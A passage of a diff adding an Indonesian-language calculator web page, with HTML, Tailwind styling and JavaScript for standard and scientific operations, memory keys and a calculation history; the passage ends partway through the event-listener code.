@@ -1,0 +1,1303 @@
+<!DOCTYPE html>
+<html lang="id" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kalkulator Pintar Modern</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace'],
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        /* Custom scrollbar untuk riwayat */
+        ::-webkit-scrollbar {
+            width: 5px;
+            height: 5px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: rgba(156, 163, 175, 0.3);
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(156, 163, 175, 0.5);
+        }
+
+        /* Efek tekan tombol */
+        .calc-btn {
+            transition: all 0.12s cubic-bezier(0.4, 0, 0.2, 1);
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .calc-btn:active, .calc-btn.active-key {
+            transform: scale(0.93);
+        }
+
+        /* Animasi muncul item riwayat */
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(-8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .history-item {
+            animation: slideIn 0.2s ease-out forwards;
+        }
+    </style>
+</head>
+<body class="bg-slate-100 dark:bg-slate-950 text-slate-800 dark:text-slate-100 min-h-screen flex flex-col justify-between transition-colors duration-300 font-sans selection:bg-indigo-500 selection:text-white">
+
+    <!-- Navbar / Header -->
+    <header class="w-full max-w-5xl mx-auto px-4 pt-4 pb-2 flex items-center justify-between">
+        <div class="flex items-center gap-3">
+            <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center text-white shadow-lg shadow-indigo-500/30">
+                <i class="fa-solid fa-calculator text-lg"></i>
+            </div>
+            <div>
+                <h1 class="font-bold text-lg leading-tight">Kalkulator<span class="text-indigo-600 dark:text-indigo-400">Pro</span></h1>
+                <p class="text-xs text-slate-500 dark:text-slate-400">Standar & Ilmiah</p>
+            </div>
+        </div>
+
+        <div class="flex items-center gap-2">
+            <!-- Tombol Panduan Keyboard -->
+            <button id="shortcutBtn" class="p-2.5 rounded-xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 text-slate-600 dark:text-slate-300 hover:bg-slate-50 dark:hover:bg-slate-800 transition shadow-sm" title="Pintasan Keyboard">
+                <i class="fa-regular fa-keyboard"></i>
+            </button>
+            <!-- Tombol Toggle Tema -->
+            <button id="themeToggle" class="p-2.5 rounded-xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 text-slate-600 dark:text-slate-300 hover:bg-slate-50 dark:hover:bg-slate-800 transition shadow-sm" title="Ganti Tema">
+                <i class="fa-solid fa-sun hidden dark:inline text-amber-400"></i>
+                <i class="fa-solid fa-moon inline dark:hidden text-indigo-600"></i>
+            </button>
+        </div>
+    </header>
+
+    <!-- Konten Utama -->
+    <main class="flex-1 flex items-center justify-center p-4">
+        <div class="w-full max-w-4xl grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
+            
+            <!-- Kolom Kalkulator Utama -->
+            <div class="lg:col-span-7 bg-white dark:bg-slate-900 rounded-3xl p-5 sm:p-6 shadow-xl shadow-slate-200/60 dark:shadow-black/40 border border-slate-200/70 dark:border-slate-800/80 transition-all">
+                
+                <!-- Bar Kontrol ModeKalkulator -->
+                <div class="flex items-center justify-between mb-4">
+                    <div class="inline-flex p-1 rounded-xl bg-slate-100 dark:bg-slate-800/80 text-xs font-medium">
+                        <button id="modeStandard" class="px-3 py-1.5 rounded-lg bg-white dark:bg-slate-700 text-indigo-600 dark:text-white shadow-sm transition">
+                            Standar
+                        </button>
+                        <button id="modeSci" class="px-3 py-1.5 rounded-lg text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white transition">
+                            Ilmiah
+                        </button>
+                    </div>
+
+                    <!-- Indikator Memory & Sudut -->
+                    <div class="flex items-center gap-2">
+                        <span id="memoryIndicator" class="hidden text-xs font-mono px-2 py-0.5 rounded bg-amber-500/10 text-amber-600 dark:text-amber-400 border border-amber-500/20">
+                            M
+                        </span>
+                        <button id="degRadToggle" class="hidden text-xs font-mono font-semibold px-2.5 py-1 rounded-lg bg-indigo-50 dark:bg-indigo-950/60 text-indigo-600 dark:text-indigo-400 border border-indigo-200 dark:border-indigo-800/60 hover:bg-indigo-100 transition">
+                            DEG
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Layar Tampilan (Display) -->
+                <div class="relative bg-slate-50 dark:bg-slate-950/90 rounded-2xl p-4 sm:p-5 mb-5 border border-slate-200/60 dark:border-slate-800/80 flex flex-col justify-end min-h-[130px] overflow-hidden group">
+                    <!-- Tombol Salin Hasil -->
+                    <button id="copyBtn" class="absolute top-3 left-3 opacity-80 sm:opacity-0 group-hover:opacity-100 transition-opacity text-xs flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-slate-200/70 dark:bg-slate-800 text-slate-600 dark:text-slate-300 hover:bg-indigo-500 hover:text-white dark:hover:bg-indigo-600" title="Salin hasil">
+                        <i class="fa-regular fa-copy"></i>
+                        <span id="copyText">Salin</span>
+                    </button>
+
+                    <!-- Ekspresi Sebelumnya -->
+                    <div id="prevDisplay" class="text-right text-slate-400 dark:text-slate-500 text-sm sm:text-base font-mono min-h-[1.5rem] break-all overflow-x-auto whitespace-nowrap scrollbar-none"></div>
+                    
+                    <!-- Input / Hasil Saat Ini -->
+                    <div id="currDisplay" class="text-right text-slate-800 dark:text-slate-100 text-3xl sm:text-4xl font-bold font-mono tracking-tight break-all overflow-x-auto whitespace-nowrap mt-1">0</div>
+                </div>
+
+                <!-- Baris Tombol Memori -->
+                <div class="grid grid-cols-4 gap-2 mb-3">
+                    <button data-mem="MC" class="calc-btn py-1.5 rounded-xl text-xs font-semibold bg-slate-100 dark:bg-slate-800/50 text-slate-500 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-800 transition">MC</button>
+                    <button data-mem="MR" class="calc-btn py-1.5 rounded-xl text-xs font-semibold bg-slate-100 dark:bg-slate-800/50 text-slate-500 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-800 transition">MR</button>
+                    <button data-mem="M+" class="calc-btn py-1.5 rounded-xl text-xs font-semibold bg-slate-100 dark:bg-slate-800/50 text-slate-500 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-800 transition">M+</button>
+                    <button data-mem="M-" class="calc-btn py-1.5 rounded-xl text-xs font-semibold bg-slate-100 dark:bg-slate-800/50 text-slate-500 dark:text-slate-400 hover:bg-slate-200 dark:hover:bg-slate-800 transition">M-</button>
+                </div>
+
+                <!-- Panel Tombol Ilmiah (Disembunyikan secara default) -->
+                <div id="sciPad" class="hidden grid-cols-4 gap-2.5 mb-2.5 pb-2.5 border-b border-slate-200 dark:border-slate-800">
+                    <button data-sci="sin" class="calc-btn py-2.5 rounded-xl text-sm font-medium bg-indigo-50/70 dark:bg-slate-800/70 text-indigo-700 dark:text-indigo-300 hover:bg-indigo-100 dark:hover:bg-slate-700">sin</button>
+                    <button data-sci="cos" class="calc-btn py-2.5 rounded-xl text-sm font-medium bg-indigo-50/70 dark:bg-slate-800/70 text-indigo-700 dark:text-indigo-300 hover:bg-indigo-100 dark:hover:bg-slate-700">cos</button>
+                    <button data-sci="tan" class="calc-btn py-2.5 rounded-xl text-sm font-medium bg-indigo-50/70 dark:bg-slate-800/70 text-indigo-700 dark:text-indigo-300 hover:bg-indigo-100 dark:hover:bg-slate-700">tan</button>
+                    <button data-sci="sqrt" class="calc-btn py-2.5 rounded-xl text-sm font-medium bg-indigo-50/70 dark:bg-slate-800/70 text-indigo-700 dark:text-indigo-300 hover:bg-indigo-100 dark:hover:bg-slate-700">√x</button>
+                    
+                    <button data-sci="sq" class="calc-btn py-2.5 rounded-xl text-sm font-medium bg-indigo-50/70 dark:bg-slate-800/70 text-indigo-700 dark:text-indigo-300 hover:bg-indigo-100 dark:hover:bg-slate-700">x²</button>
+                    <button data-sci="log" class="calc-btn py-2.5 rounded-xl text-sm font-medium bg-indigo-50/70 dark:bg-slate-800/70 text-indigo-700 dark:text-indigo-300 hover:bg-indigo-100 dark:hover:bg-slate-700">log</button>
+                    <button data-sci="ln" class="calc-btn py-2.5 rounded-xl text-sm font-medium bg-indigo-50/70 dark:bg-slate-800/70 text-indigo-700 dark:text-indigo-300 hover:bg-indigo-100 dark:hover:bg-slate-700">ln</button>
+                    <button data-sci="pi" class="calc-btn py-2.5 rounded-xl text-sm font-medium bg-indigo-50/70 dark:bg-slate-800/70 text-indigo-700 dark:text-indigo-300 hover:bg-indigo-100 dark:hover:bg-slate-700">π</button>
+                </div>
+
+                <!-- Tombol Kalkulator Standar -->
+                <div class="grid grid-cols-4 gap-2.5 sm:gap-3">
+                    <!-- Baris 1 -->
+                    <button data-action="clear" data-key="Escape" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-base sm:text-lg bg-rose-500/10 dark:bg-rose-500/15 text-rose-600 dark:text-rose-400 hover:bg-rose-500/20 border border-rose-500/20">
+                        AC
+                    </button>
+                    <button data-action="delete" data-key="Backspace" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-base sm:text-lg bg-slate-100 dark:bg-slate-800 text-slate-700 dark:text-slate-200 hover:bg-slate-200 dark:hover:bg-slate-700">
+                        <i class="fa-solid fa-delete-left"></i>
+                    </button>
+                    <button data-action="percent" data-key="%" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-base sm:text-lg bg-slate-100 dark:bg-slate-800 text-slate-700 dark:text-slate-200 hover:bg-slate-200 dark:hover:bg-slate-700">
+                        %
+                    </button>
+                    <button data-operator="÷" data-key="/" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-xl bg-indigo-50 dark:bg-indigo-950/60 text-indigo-600 dark:text-indigo-400 hover:bg-indigo-100 dark:hover:bg-indigo-900/60 border border-indigo-200/50 dark:border-indigo-800/40">
+                        ÷
+                    </button>
+
+                    <!-- Baris 2 -->
+                    <button data-number="7" data-key="7" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-xl bg-slate-50 dark:bg-slate-800/60 text-slate-800 dark:text-slate-100 hover:bg-slate-100 dark:hover:bg-slate-800 border border-slate-200/60 dark:border-slate-700/50 shadow-sm">
+                        7
+                    </button>
+                    <button data-number="8" data-key="8" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-xl bg-slate-50 dark:bg-slate-800/60 text-slate-800 dark:text-slate-100 hover:bg-slate-100 dark:hover:bg-slate-800 border border-slate-200/60 dark:border-slate-700/50 shadow-sm">
+                        8
+                    </button>
+                    <button data-number="9" data-key="9" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-xl bg-slate-50 dark:bg-slate-800/60 text-slate-800 dark:text-slate-100 hover:bg-slate-100 dark:hover:bg-slate-800 border border-slate-200/60 dark:border-slate-700/50 shadow-sm">
+                        9
+                    </button>
+                    <button data-operator="×" data-key="*" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-xl bg-indigo-50 dark:bg-indigo-950/60 text-indigo-600 dark:text-indigo-400 hover:bg-indigo-100 dark:hover:bg-indigo-900/60 border border-indigo-200/50 dark:border-indigo-800/40">
+                        ×
+                    </button>
+
+                    <!-- Baris 3 -->
+                    <button data-number="4" data-key="4" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-xl bg-slate-50 dark:bg-slate-800/60 text-slate-800 dark:text-slate-100 hover:bg-slate-100 dark:hover:bg-slate-800 border border-slate-200/60 dark:border-slate-700/50 shadow-sm">
+                        4
+                    </button>
+                    <button data-number="5" data-key="5" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-xl bg-slate-50 dark:bg-slate-800/60 text-slate-800 dark:text-slate-100 hover:bg-slate-100 dark:hover:bg-slate-800 border border-slate-200/60 dark:border-slate-700/50 shadow-sm">
+                        5
+                    </button>
+                    <button data-number="6" data-key="6" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-xl bg-slate-50 dark:bg-slate-800/60 text-slate-800 dark:text-slate-100 hover:bg-slate-100 dark:hover:bg-slate-800 border border-slate-200/60 dark:border-slate-700/50 shadow-sm">
+                        6
+                    </button>
+                    <button data-operator="-" data-key="-" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-xl bg-indigo-50 dark:bg-indigo-950/60 text-indigo-600 dark:text-indigo-400 hover:bg-indigo-100 dark:hover:bg-indigo-900/60 border border-indigo-200/50 dark:border-indigo-800/40">
+                        −
+                    </button>
+
+                    <!-- Baris 4 -->
+                    <button data-number="1" data-key="1" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-xl bg-slate-50 dark:bg-slate-800/60 text-slate-800 dark:text-slate-100 hover:bg-slate-100 dark:hover:bg-slate-800 border border-slate-200/60 dark:border-slate-700/50 shadow-sm">
+                        1
+                    </button>
+                    <button data-number="2" data-key="2" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-xl bg-slate-50 dark:bg-slate-800/60 text-slate-800 dark:text-slate-100 hover:bg-slate-100 dark:hover:bg-slate-800 border border-slate-200/60 dark:border-slate-700/50 shadow-sm">
+                        2
+                    </button>
+                    <button data-number="3" data-key="3" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-xl bg-slate-50 dark:bg-slate-800/60 text-slate-800 dark:text-slate-100 hover:bg-slate-100 dark:hover:bg-slate-800 border border-slate-200/60 dark:border-slate-700/50 shadow-sm">
+                        3
+                    </button>
+                    <button data-operator="+" data-key="+" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-xl bg-indigo-50 dark:bg-indigo-950/60 text-indigo-600 dark:text-indigo-400 hover:bg-indigo-100 dark:hover:bg-indigo-900/60 border border-indigo-200/50 dark:border-indigo-800/40">
+                        +
+                    </button>
+
+                    <!-- Baris 5 -->
+                    <button data-action="sign" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-lg bg-slate-50 dark:bg-slate-800/60 text-slate-800 dark:text-slate-100 hover:bg-slate-100 dark:hover:bg-slate-800 border border-slate-200/60 dark:border-slate-700/50 shadow-sm">
+                        ±
+                    </button>
+                    <button data-number="0" data-key="0" class="calc-btn h-14 sm:h-16 rounded-2xl font-semibold text-xl bg-slate-50 dark:bg-slate-800/60 text-slate-800 dark:text-slate-100 hover:bg-slate-100 dark:hover:bg-slate-800 border border-slate-200/60 dark:border-slate-700/50 shadow-sm">
+                        0
+                    </button>
+                    <button data-number="." data-key="." class="calc-btn h-14 sm:h-16 rounded-2xl font-bold text-xl bg-slate-50 dark:bg-slate-800/60 text-slate-800 dark:text-slate-100 hover:bg-slate-100 dark:hover:bg-slate-800 border border-slate-200/60 dark:border-slate-700/50 shadow-sm">
+                        ,
+                    </button>
+                    <button data-action="equals" data-key="Enter" class="calc-btn h-14 sm:h-16 rounded-2xl font-bold text-xl bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-500 hover:to-purple-500 text-white shadow-lg shadow-indigo-500/30">
+                        =
+                    </button>
+                </div>
+            </div>
+
+            <!-- Kolom Riwayat Perhitungan -->
+            <div class="lg:col-span-5 bg-white dark:bg-slate-900 rounded-3xl p-5 sm:p-6 shadow-xl shadow-slate-200/60 dark:shadow-black/40 border border-slate-200/70 dark:border-slate-800/80 flex flex-col h-[380px] lg:h-[580px]">
+                <div class="flex items-center justify-between pb-4 mb-4 border-b border-slate-100 dark:border-slate-800">
+                    <div class="flex items-center gap-2">
+                        <i class="fa-solid fa-clock-rotate-left text-indigo-500"></i>
+                        <h2 class="font-bold text-base">Riwayat Perhitungan</h2>
+                    </div>
+                    <button id="clearHistoryBtn" class="text-xs text-rose-500 hover:text-rose-600 dark:hover:text-rose-400 font-medium flex items-center gap-1 px-2 py-1 rounded-lg hover:bg-rose-50 dark:hover:bg-rose-950/40 transition hidden">
+                        <i class="fa-regular fa-trash-can"></i> Hapus
+                    </button>
+                </div>
+
+                <!-- Daftar Riwayat -->
+                <div id="historyList" class="flex-1 overflow-y-auto space-y-2.5 pr-1">
+                    <!-- State Kosong -->
+                    <div id="emptyHistory" class="h-full flex flex-col items-center justify-center text-center text-slate-400 dark:text-slate-600 p-4">
+                        <i class="fa-solid fa-receipt text-3xl mb-2 opacity-50"></i>
+                        <p class="text-sm font-medium">Belum ada riwayat</p>
+                        <p class="text-xs mt-1">Perhitungan Anda akan tersimpan otomatis di sini. Klik item untuk menggunakan kembali angkanya.</p>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Modal Pintasan Keyboard -->
+    <div id="shortcutModal" class="fixed inset-0 z-50 bg-black/50 backdrop-blur-sm hidden items-center justify-center p-4">
+        <div class="bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-3xl max-w-md w-full p-6 shadow-2xl animate-[slideIn_0.2s_ease-out]">
+            <div class="flex items-center justify-between mb-4">
+                <h3 class="font-bold text-lg flex items-center gap-2">
+                    <i class="fa-regular fa-keyboard text-indigo-500"></i>
+                    Pintasan Keyboard
+                </h3>
+                <button id="closeModalBtn" class="w-8 h-8 rounded-lg flex items-center justify-center text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 hover:bg-slate-100 dark:hover:bg-slate-800">
+                    <i class="fa-solid fa-xmark"></i>
+                </button>
+            </div>
+            <div class="space-y-3 text-sm">
+                <div class="flex justify-between items-center py-1.5 border-b border-slate-100 dark:border-slate-800">
+                    <span class="text-slate-600 dark:text-slate-400">Angka & Desimal</span>
+                    <kbd class="px-2 py-1 bg-slate-100 dark:bg-slate-800 rounded text-xs font-mono">0-9, . atau ,</kbd>
+                </div>
+                <div class="flex justify-between items-center py-1.5 border-b border-slate-100 dark:border-slate-800">
+                    <span class="text-slate-600 dark:text-slate-400">Operasi Dasar</span>
+                    <kbd class="px-2 py-1 bg-slate-100 dark:bg-slate-800 rounded text-xs font-mono">+ - * /</kbd>
+                </div>
+                <div class="flex justify-between items-center py-1.5 border-b border-slate-100 dark:border-slate-800">
+                    <span class="text-slate-600 dark:text-slate-400">Hitung Hasil (=)</span>
+                    <kbd class="px-2 py-1 bg-slate-100 dark:bg-slate-800 rounded text-xs font-mono">Enter / =</kbd>
+                </div>
+                <div class="flex justify-between items-center py-1.5 border-b border-slate-100 dark:border-slate-800">
+                    <span class="text-slate-600 dark:text-slate-400">Hapus 1 Karakter</span>
+                    <kbd class="px-2 py-1 bg-slate-100 dark:bg-slate-800 rounded text-xs font-mono">Backspace</kbd>
+                </div>
+                <div class="flex justify-between items-center py-1.5">
+                    <span class="text-slate-600 dark:text-slate-400">Reset Semua (AC)</span>
+                    <kbd class="px-2 py-1 bg-slate-100 dark:bg-slate-800 rounded text-xs font-mono">Escape / Delete</kbd>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="text-center py-4 text-xs text-slate-400 dark:text-slate-600">
+        Dibuat dengan responsif & presisi tinggi • Mendukung penuh input keyboard
+    </footer>
+
+    <!-- Script Utama Kalkulator -->
+    <script>
+        // State Kalkulator
+        const state = {
+            currentOperand: '0',
+            previousOperand: '',
+            operation: undefined,
+            shouldResetScreen: false,
+            memory: 0,
+            isDegree: true,
+            history: []
+        };
+
+        // Elemen DOM
+        const currDisplay = document.getElementById('currDisplay');
+        const prevDisplay = document.getElementById('prevDisplay');
+        const historyList = document.getElementById('historyList');
+        const emptyHistory = document.getElementById('emptyHistory');
+        const clearHistoryBtn = document.getElementById('clearHistoryBtn');
+        const memoryIndicator = document.getElementById('memoryIndicator');
+        const degRadToggle = document.getElementById('degRadToggle');
+        const sciPad = document.getElementById('sciPad');
+        const modeStandard = document.getElementById('modeStandard');
+        const modeSci = document.getElementById('modeSci');
+
+        // Format angka ke format lokal Indonesia (titik ribuan, koma desimal) untuk tampilan
+        function formatDisplayNumber(numberStr) {
+            if (numberStr === 'Error' || numberStr === 'Tak Terhingga') return numberStr;
+            if (numberStr === '' || numberStr === undefined) return '';
+            
+            const stringNumber = numberStr.toString();
+            // Jika menggunakan notasi ilmiah (e+)
+            if (stringNumber.includes('e')) {
+                return stringNumber.replace('.', ',');
+            }
+
+            const parts = stringNumber.split('.');
+            const integerPart = parts[0];
+            const decimalPart = parts[1];
+
+            let integerDisplay;
+            if (integerPart === '' || integerPart === '-') {
+                integerDisplay = integerPart;
+            } else {
+                const num = parseFloat(integerPart);
+                integerDisplay = isNaN(num) ? '' : num.toLocaleString('id-ID');
+            }
+
+            if (decimalPart != null) {
+                return `${integerDisplay},${decimalPart}`;
+            } else {
+                return integerDisplay;
+            }
+        }
+
+        // Update tampilan layar
+        function updateDisplay() {
+            currDisplay.innerText = formatDisplayNumber(state.currentOperand);
+            if (state.operation != null) {
+                prevDisplay.innerText = `${formatDisplayNumber(state.previousOperand)} ${state.operation}`;
+            } else {
+                prevDisplay.innerText = state.previousOperand ? formatDisplayNumber(state.previousOperand) : '';
+            }
+        }
+
+        // Tambah angka
+        function appendNumber(number) {
+            if (state.currentOperand === 'Error' || state.currentOperand === 'Tak Terhingga') {
+                clearAll();
+            }
+            if (state.shouldResetScreen) {
+                state.currentOperand = '';
+                state.shouldResetScreen = false;
+            }
+            // Cegah lebih dari satu titik desimal
+            if (number === '.' && state.currentOperand.includes('.')) return;
+            // Batasi panjang input agar tidak meluber berlebihan
+            if (state.currentOperand.replace('.', '').length >= 15) return;
+
+            if (state.currentOperand === '0' && number !== '.') {
+                state.currentOperand = number.toString();
+            } else if (state.currentOperand === '' && number === '.') {
+                state.currentOperand = '0.';
+            } else {
+                state.currentOperand = state.currentOperand.toString() + number.toString();
+            }
+            updateDisplay();
+        }
+
+        // Pilih operator (+, -, ×, ÷)
+        function chooseOperation(operation) {
+            if (state.currentOperand === 'Error' || state.currentOperand === 'Tak Terhingga') return;
+            if (state.currentOperand === '' && state.previousOperand === '') return;
+
+            if (state.previousOperand !== '' && !state.shouldResetScreen) {
+                compute();
+            }
+
+            state.operation = operation;
+            state.previousOperand = state.currentOperand;
+            state.shouldResetScreen = true;
+            updateDisplay();
+        }
+
+        // Bersihkan hasil presisi floating point (contoh: 0.1 + 0.2 = 0.3)
+        function cleanPrecision(num) {
+            return parseFloat(Number(num).toPrecision(12));
+        }
+
+        // Lakukan perhitungan utama
+        function compute() {
+            let computation;
+            const prev = parseFloat(state.previousOperand);
+            const current = parseFloat(state.currentOperand);
+            if (isNaN(prev) || isNaN(current)) return;
+
+            switch (state.operation) {
+                case '+':
+                    computation = prev + current;
+                    break;
+                case '-':
+                    computation = prev - current;
+                    break;
+                case '×':
+                    computation = prev * current;
+                    break;
+                case '÷':
+                    if (current === 0) {
+                        state.currentOperand = 'Tak Terhingga';
+                        state.previousOperand = '';
+                        state.operation = undefined;
+                        state.shouldResetScreen = true;
+                        updateDisplay();
+                        return;
+                    }
+                    computation = prev / current;
+                    break;
+                default:
+                    return;
+            }
+
+            const result = cleanPrecision(computation);
+            const expression = `${formatDisplayNumber(prev)} ${state.operation} ${formatDisplayNumber(current)}`;
+            
+            addToHistory(expression, result.toString());
+
+            state.currentOperand = result.toString();
+            state.operation = undefined;
+            state.previousOperand = '';
+            state.shouldResetScreen = true;
+            updateDisplay();
+        }
+
+        // Fungsi Ilmiah (Scientific)
+        function executeScientific(func) {
+            const current = parseFloat(state.currentOperand);
+            if (isNaN(current) && func !== 'pi') return;
+
+            let result;
+            let label = '';
+
+            const toAngle = (val) => state.isDegree ? val * (Math.PI / 180) : val;
+
+            switch (func) {
+                case 'sin':
+                    result = cleanPrecision(Math.sin(toAngle(current)));
+                    label = `sin(${formatDisplayNumber(current)}${state.isDegree ? '°' : ''})`;
+                    break;
+                case 'cos':
+                    result = cleanPrecision(Math.cos(toAngle(current)));
+                    label = `cos(${formatDisplayNumber(current)}${state.isDegree ? '°' : ''})`;
+                    break;
+                case 'tan':
+                    // Cek asimtot tan (90, 270 derajat, dst)
+                    if (state.isDegree && Math.abs(current % 180) === 90) {
+                        state.currentOperand = 'Tak Terhingga';
+                        state.shouldResetScreen = true;
+                        updateDisplay();
+                        return;
+                    }
+                    result = cleanPrecision(Math.tan(toAngle(current)));
+                    label = `tan(${formatDisplayNumber(current)}${state.isDegree ? '°' : ''})`;
+                    break;
+                case 'sqrt':
+                    if (current < 0) {
+                        state.currentOperand = 'Error';
+                        state.shouldResetScreen = true;
+                        updateDisplay();
+                        return;
+                    }
+                    result = cleanPrecision(Math.sqrt(current));
+                    label = `√(${formatDisplayNumber(current)})`;
+                    break;
+                case 'sq':
+                    result = cleanPrecision(Math.pow(current, 2));
+                    label = `(${formatDisplayNumber(current)})²`;
+                    break;
+                case 'log':
+                    if (current <= 0) {
+                        state.currentOperand = 'Error';
+                        state.shouldResetScreen = true;
+                        updateDisplay();
+                        return;
+                    }
+                    result = cleanPrecision(Math.log10(current));
+                    label = `log(${formatDisplayNumber(current)})`;
+                    break;
+                case 'ln':
+                    if (current <= 0) {
+                        state.currentOperand = 'Error';
+                        state.shouldResetScreen = true;
+                        updateDisplay();
+                        return;
+                    }
+                    result = cleanPrecision(Math.log(current));
+                    label = `ln(${formatDisplayNumber(current)})`;
+                    break;
+                case 'pi':
+                    state.currentOperand = cleanPrecision(Math.PI).toString();
+                    state.shouldResetScreen = true;
+                    updateDisplay();
+                    return;
+            }
+
+            addToHistory(label, result.toString());
+            state.currentOperand = result.toString();
+            state.shouldResetScreen = true;
+            updateDisplay();
+        }
+
+        // Hapus Semua (AC)
+        function clearAll() {
+            state.currentOperand = '0';
+            state.previousOperand = '';
+            state.operation = undefined;
+            state.shouldResetScreen = false;
+            updateDisplay();
+        }
+
+        // Hapus 1 Karakter (Backspace)
+        function deleteChar() {
+            if (state.currentOperand === 'Error' || state.currentOperand === 'Tak Terhingga' || state.shouldResetScreen) {
+                clearAll();
+                return;
+            }
+            if (state.currentOperand.length === 1 || (state.currentOperand.length === 2 && state.currentOperand.startsWith('-'))) {
+                state.currentOperand = '0';
+            } else {
+                state.currentOperand = state.currentOperand.toString().slice(0, -1);
+            }
+            updateDisplay();
+        }
+
+        // Ubah tanda positif/negatif (±)
+        function toggleSign() {
+            if (state.currentOperand === '0' || state.currentOperand === 'Error' || state.currentOperand === 'Tak Terhingga') return;
+            state.currentOperand = (parseFloat(state.currentOperand) * -1).toString();
+            updateDisplay();
+        }
+
+        // Persentase (%)
+        function calculatePercent() {
+            const current = parseFloat(state.currentOperand);
+            if (isNaN(current)) return;
+            state.currentOperand = cleanPrecision(current / 100).toString();
+            updateDisplay();
+        }
+
+        // Fungsi Memori (MC, MR, M+, M-)
+        function handleMemory(type) {
+            const current = parseFloat(state.currentOperand);
+            switch (type) {
+                case 'MC':
+                    state.memory = 0;
+                    break;
+                case 'MR':
+                    state.currentOperand = state.memory.toString();
+                    state.shouldResetScreen = true;
+                    updateDisplay();
+                    break;
+                case 'M+':
+                    if (!isNaN(current)) state.memory = cleanPrecision(state.memory + current);
+                    state.shouldResetScreen = true;
+                    break;
+                case 'M-':
+                    if (!isNaN(current)) state.memory = cleanPrecision(state.memory - current);
+                    state.shouldResetScreen = true;
+                    break;
+            }
+            memoryIndicator.classList.toggle('hidden', state.memory === 0);
+        }
+
+        // Tambah ke Riwayat
+        function addToHistory(expression, resultStr) {
+            state.history.unshift({ expression, result: resultStr });
+            if (state.history.length > 30) state.history.pop();
+            renderHistory();
+        }
+
+        // Render Daftar Riwayat
+        function renderHistory() {
+            if (state.history.length === 0) {
+                emptyHistory.classList.remove('hidden');
+                clearHistoryBtn.classList.add('hidden');
+                // Hapus semua item kecuali emptyHistory
+                Array.from(historyList.children).forEach(child => {
+                    if (child.id !== 'emptyHistory') child.remove();
+                });
+                return;
+            }
+
+            emptyHistory.classList.add('hidden');
+            clearHistoryBtn.classList.remove('hidden');
+
+            // Bersihkan item lama
+            Array.from(historyList.children).forEach(child => {
+                if (child.id !== 'emptyHistory') child.remove();
+            });
+
+            state.history.forEach((item) => {
+                const div = document.createElement('div');
+                div.className = 'history-item p-3 rounded-2xl bg-slate-50 dark:bg-slate-800/50 hover:bg-indigo-50/70 dark:hover:bg-slate-800 border border-slate-200/50 dark:border-slate-800 cursor-pointer transition group text-right';
+                div.innerHTML = `
+                    <div class="text-xs text-slate-400 dark:text-slate-500 font-mono mb-0.5">${item.expression} =</div>
+                    <div class="text-lg font-bold font-mono text-slate-700 dark:text-slate-200 group-hover:text-indigo-600 dark:group-hover:text-indigo-400 transition">${formatDisplayNumber(item.result)}</div>
+                `;
+                div.addEventListener('click', () => {
+                    state.currentOperand = item.result;
+                    state.shouldResetScreen = true;
+                    updateDisplay();
+                });
+                historyList.appendChild(div);
+            });
+        }
+
+        // Event Listeners untuk Tombol Angka
+        document.querySelectorAll('[data-number]').forEach(button => {
+            button.addEventListener('click', () => appendNumber(button.dataset.number));
+        });
+
+        // Event Listeners untuk Operator
+        document.querySelectorAll('[data-operator]').forEach(button => {
+            button.addEventListener('click', () => chooseOperation(button.dataset.operator));
+        });
+
+        // Event Listeners untuk Aksi Khusus
+        document.querySelectorAll('[data-action]').forEach(button => {
+            button.addEventListener('click', () => {
+                const action = button.dataset.action;
+                if (action === 'clear') clearAll();
